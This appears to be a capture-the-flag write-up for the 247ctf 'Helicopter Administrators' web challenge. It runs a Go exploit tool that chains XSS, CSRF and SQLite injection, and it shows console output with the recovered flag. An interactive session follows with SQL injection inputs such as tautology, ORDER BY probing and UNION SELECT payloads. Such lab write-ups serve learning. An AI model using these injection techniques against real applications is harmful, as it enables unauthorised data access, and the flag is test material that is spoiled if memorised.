### Helicopter Administrators Solved ( Rated Hard ) - 300 points

```
This applications administrators are very aggressive. They will immediately view any page you report. Can you trick them into disclosing data they shouldn't? 
```
This challenge is compensation of bypassing blacklist, Advanced XXS, CSRF, SQLite Injeciton.


1- Change 	`urlBase` varible to your generated url:

```go
string = "https://feef92c0eb0c14bf.247ctf.com
```

Then you are ready to go:
To get only the flag, run the following:


```go
*$ go run cmd/xss/main.go              
[+] Advanced XSS Challenge at 247ctf.com - HELICOPTER ADMINISTRATORS
[+] Cleaning stuff..
[+] Sending XSS Payload..
[+] Reporting the comment - Go Admin!..
[+] Parsing the HTML Page ..
[+] Sending Search data ..
{"message":[[1,2,3,4,5,"247CTF{c9355024736f1fdfa121e243c7024540}"]],"result":"success"}

*$ 
```

You also have interactive shell with the backend of the `sqlite`

```sh
*$ go run cmd/xss/main.go -h
Usage of /tmp/go-build950372382/b001/exe/main:
  -interactive
    	[+] Interactive to manual SQL injection!
exit status 2
*$ 
```

Lets try to interactive with the backend databse:

```bash
*$ go run cmd/xss/main.go --interactive
[+] Advanced XSS Challenge at 247ctf.com - HELICOPTER ADMINISTRATORS
[+] Cleaning stuff..
[+] Sending XSS Payload..
[+] Reporting the comment - Go Admin!..
[+] Parsing the HTML Page ..
[+] Sending Search data ..
#-> 1
{"message":[[1,"Michael Owens",14,22,3,"Sydney, Australia"]],"result":"success"}

#-> 1337 or 1=1;--
{"message":[[0,"Administrator",100,100,100,"New York, USA"],[1,"Michael Owens",14,22,3,"Sydney, Australia"],[2,"Alice Brock",72,132,28,"Amsterdam, Nederland"],[3,"Sally Alterman",3,1,0,"Berlin, Germany"]],"result":"success"}

#-> 1337 order by 1;--
{"message":[],"result":"success"}

#-> 1337 order by 7;--
{"message":"SQLite error: 1st ORDER BY term out of range - should be between 1 and 6","result":"error"}

#-> 1337 union select 1,2,3,4,5,6;--
{"message":[[1,2,3,4,5,6]],"result":"success"}

```

